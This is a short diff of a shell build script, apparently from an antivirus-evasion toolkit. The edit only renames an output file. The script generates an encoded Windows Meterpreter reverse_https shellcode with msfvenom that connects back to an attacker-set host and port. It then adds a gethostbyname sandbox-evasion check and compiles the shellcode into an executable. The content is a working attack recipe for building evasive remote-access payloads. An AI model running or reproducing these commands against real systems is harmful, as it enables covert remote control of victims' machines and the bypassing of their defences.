@@ -17,7 +17,7 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # generate payload and call avet
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc_c.txt
 
 # add gethostbyname sandbox evasion
 add_evasion gethostbyname_sandbox_evasion
@@ -25,7 +25,7 @@ add_evasion gethostbyname_sandbox_evasion
 printf "\n#define HOSTVALUE \"this.that\"\n" >> source/evasion/evasion.include
 
 # set shellcode source
-set_shellcode_source static_from_file input/sc.txt
+set_shellcode_source static_from_file input/sc_c.txt
 
 # set decoder and key source
 set_decoder none
